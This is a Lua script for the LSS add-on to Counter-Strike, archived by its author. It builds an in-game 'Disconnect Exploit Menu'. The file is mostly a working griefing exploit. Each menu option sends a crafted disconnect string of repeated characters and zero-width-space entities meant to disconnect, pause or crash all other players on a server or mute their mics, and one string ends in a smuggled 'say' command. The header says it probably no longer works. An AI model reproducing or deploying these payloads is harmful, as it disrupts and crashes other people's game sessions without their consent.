-- #############
-- #############
-- Note from 2020: This probably doesn't work anymore. Just doing this to archive
-- #############
-- #############

-- Sense so many people are starting to leach it, enjoy no more sells!
-- You must have LSS for this to work: http://www.3rdera.com/ To make this 
-- script work, after installing LSS, type ***OPENSCRIPTCMD*** DCMenu.lua open
-- It MUST be named DCMenu.lua or else it wont work.


LSStxt = "cstrike/addons/LSS.txt" -- don't change this, this is the same for everyone
file = io.open(LSStxt, "r")  -- this will open LSStxt in reading mode and store it in the variable
runCMD = file:read()
newline="\r"
name="MikE"

function JustSoItWorks()
    --cmd("setinfo name Fail")
    cmd("echo Its already good...")
end

if args=="" then
    cmd("echo ERROR!!! Please contact MikE about this and follow his instructions.")
    cmd("echo If you typed "..runCMD.." DCMenu.lua, please type "..runCMD.." DCMenu.lua open.")
end

function drawmenu() -- Declare our function called drawmenu()
    menu = {} -- Declare table called menu
    s_item = tonumber(getCVar("adsp_door_height")) -- here we set s_item to the value stored in adsp_door_height, we're using tonumber() to convert it to an integer
    for i=1,10 do -- scroll through the menu items
        if i == s_item then -- if the menu item id is equal to value stored in adsp_door_height we "Highlight" it
            menu[i] = "[>>>]   "
        else
            menu[i] = "[---]"
        end
    end
    cmd("clear") --Clear console so previous console text isnt printed on our menu
    for i=1,10 do
        cmd('echo " "')
    end -- Lower the menu
    cmd('echo \"Disconnect Exploit Menu\"')
    cmd('echo \"           Made by MikE\"')
    cmd('echo "_________________________"')
    cmd('echo \" '..menu[1]..' Disconnect All\"')
    cmd('echo \" '..menu[2]..' Retry All\"')
    cmd('echo \" '..menu[3]..' Pause All\"')
    cmd('echo \" '..menu[4]..' Drug View\"')
    cmd('echo \" '..menu[5]..' Reset View\"')
    cmd('echo \" '..menu[6]..' Mute Mics\"')
    cmd('echo \" '..menu[7]..' Mystery!!!\"')
    cmd('echo "_________________________"')
    cmd('echo ""')
    cmd('echo \" '..menu[8]..' Block FCvar\"')
    cmd('echo \" '..menu[9]..' Crash All\"')
    cmd('echo "_________________________"')
    cmd('echo ""')
    cmd('echo \" '..menu[10]..' Exit\"')
    for i=1,50 do
        cmd('echo " "')
    end -- Make sure no other text from console is printed onto our menu
end

if args=="next" then
    if getCVar("adsp_door_height")~="10" then
        setCVar("adsp_door_height",getCVar("adsp_door_height")+1) -- adsp_door_height is used to store our selected item in, as far as I know it's a useless say You have chosen command
        drawmenu() -- Redraw our menu after we have selected the next item
    end
elseif args=="prev" then
    if getCVar("adsp_door_height")~="1" then
        setCVar("adsp_door_height",getCVar("adsp_door_height")-1) -- set the value of adsp_door_height - 1
        drawmenu() -- Redraw our menu after we have selected the previous item
    end
end

if args=="open" then
    if tonumber(getCVar("adsp_door_height")) < 1 or tonumber(getCVar("adsp_door_height")) > 10 then -- Make sure adsp_door_height is in range
        cmd("adsp_door_height 1") -- if it's not in range then we set it to 1
    end
    wait(10) -- otherwise sometimes the menu is drawn before adsp_door_height is set to 1
    cmd("bind ENTER \""..runCMD.." DCMenu.lua select\"") -- make ENTER run this script with argument select
    cmd("bind uparrow \""..runCMD.." DCMenu.lua prev\"") -- make mousewheelup run this script with argument prev
    cmd("bind downarrow \""..runCMD.." DCMenu.lua next\"") -- make mousewheelup run this script with argument next
    cmd("con_notifytime 99999999; contimes 99999999") -- How long to display recent console text to the upper part of the game window
    setCVar("developer","1") -- Needed to display console text onscreen, we are using setCVar because developer is an sv_cheats 1 required say You have chosen command
    drawmenu() --Draw our menu after binding and settings the needed cvars
elseif args=="close" then -- We close our menu here and set player's binds back to default
    cmd('bind ENTER ""') -- Bind our keys to what they were before
    cmd('bind uparrow ""') -- Bind our keys to what they were before
    cmd('bind downarrow ""') -- Bind our keys to what they were before
    cmd("con_notifytime 0; contimes 220") -- set values back to default
    setCVar("developer","0") -- set developer back to 0
end

if args=="select" then -- if player has selected an item
    s_item = tonumber(getCVar("adsp_door_height")) -- store our selected item as integer in s_item -- This is where your custom say You have chosen commands are written "say You have chosen command X" is the script.
    if s_item == 1 then
        --Disconnect All
        JustSoItWorks()
        wait(500)
        disconnect("¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢ &#8203; ¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢ &#8203; ¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢ &#8203; ¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢ &#8203; ¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢ &#8203; ¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢ &#8203; ¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢ &#8203;¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢¢")
        wait(100)
        cmd('setinfo name "'..name..'"')
        wait(100)
        cmd(""..runCMD.." DCMenu.lua close")
        wait(100)
       
        cmd("retry")
        cmd("clear")
    elseif s_item == 2 then
        --Retry All
        JustSoItWorks()
        wait(500)
        disconnect("ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff &#8203; ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff &#8203; ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff &#8203; ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff &#8203; ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff &#8203; ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff &#8203; ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff &#8203;ffffffffffffffffffffffffffffffffffffffff")
        wait(100)
        cmd('setinfo name "'..name..'"')
        wait(100)
        cmd(""..runCMD.." DCMenu.lua close")
        wait(100)
       
        cmd("retry")
        cmd("clear")
    elseif s_item == 3 then
        --Pause All
        JustSoItWorks()
        wait(500)
        disconnect("kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk &#8203; kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk &#8203; kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk &#8203; kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk &#8203; kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk &#8203; kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk &#8203; kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk &#8203;kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk")
        wait(100)
        cmd('setinfo name "'..name..'"')
        wait(100)
        cmd(""..runCMD.." DCMenu.lua close")
        wait(100)
       
        cmd("retry")
        cmd("clear")
    elseif s_item == 4 then
        --Drug
        JustSoItWorks()
        wait(500)
        disconnect("SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS &#8203; SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS &#8203; SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS &#8203; SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS &#8203; SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS &#8203; SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS &#8203; SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS &#8203;SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS")
        wait(100)
        cmd(""..runCMD.." DCMenu.lua close")
        wait(100)
       
        cmd("retry")
        cmd("clear")
    elseif s_item == 5 then
        --Reset View
        JustSoItWorks()
        wait(500)
        disconnect("ssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss &#8203; ssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss &#8203; ssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss &#8203; ssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss &#8203; ssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss &#8203; ssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss &#8203; ssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss &#8203;ssssssssssssssssssssssssssssssssssssssss")
        wait(100)
        cmd('setinfo name "'..name..'"')
        wait(100)
        cmd(""..runCMD.." DCMenu.lua close")
        wait(100)
       
        cmd("retry")
        cmd("clear")
    elseif s_item == 6 then
        --Mystery
        JustSoItWorks()
        wait(500)
        disconnect("nnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnn &#8203; nnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnn &#8203; nnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnn &#8203; nnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnn &#8203; nnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnn &#8203;nnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnn")
        wait(100)
        cmd('setinfo name "'..name..'"')
        wait(100)
        cmd(""..runCMD.." DCMenu.lua close")
        wait(100)
       
        cmd("retry")
        cmd("clear")
    elseif s_item == 7 then
        --Mystery
        JustSoItWorks()
        wait(500)
        disconnect("²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²² &#8203; ²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²² &#8203; ²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²² &#8203;²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²")
        wait(100)
        cmd('setinfo name "'..name..'"')
        wait(100)
        cmd(""..runCMD.." DCMenu.lua close")
        wait(100)
       
        cmd("retry")
        cmd("clear")
    elseif s_item == 8 then
        --Block FCvar
        JustSoItWorks()
        wait(500)
        disconnect("DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD &#8203; DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD &#8203; DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD &#8203; DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD &#8203; DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD &#8203; DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD &#8203; DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD &#8203;DDDDDDDDDDDDDDDDDDDDDDDDDDDDsay lol")
        wait(100)
        cmd('setinfo name "'..name..'"')
        wait(100)
        cmd(""..runCMD.." DCMenu.lua close")
        wait(100)
       
        cmd("retry")
        cmd("clear")
    elseif s_item == 9 then
        --Crash
        JustSoItWorks()
        wait(500)
        disconnect("{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{} &#8203; {}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{} &#8203; {}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{} &#8203; {}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{} &#8203; {}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{} &#8203; {}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{} &#8203; {}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{} &#8203;{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}")
        wait(100)
        cmd('setinfo name "'..name..'"')
        wait(100)
        cmd(""..runCMD.." DCMenu.lua close")
        wait(100)
        cmd("retry")
        cmd("clear")
    elseif s_item == 10 then
        cmd('echo ""')
        wait(100)
        cmd(""..runCMD.." DCMenu.lua close")
        cmd('echo ""')
        cmd("clear")
        cmd('echo ""')
        cmd('echo "Credits:"')
        cmd('echo "     MikE"')
        cmd('echo "         http://steamcommunity.com/id/T3H_L1V1N6_D3AD"')
        cmd('echo "     ShaneOD"')
        cmd('echo "         http://steamcommunity.com/profiles/76561197996189003"')
        cmd('echo "     IZ3RO"')
        cmd('echo "         http://steamcommunity.com/profiles/76561198023899211"')
        cmd('echo "         http://steamcommunity.com/profiles/76561198003694155"')
        cmd('echo "     Xeno"')
        cmd('echo "     BlackHole"')
        cmd('echo ""')
        cmd('echo ""')
    end
end
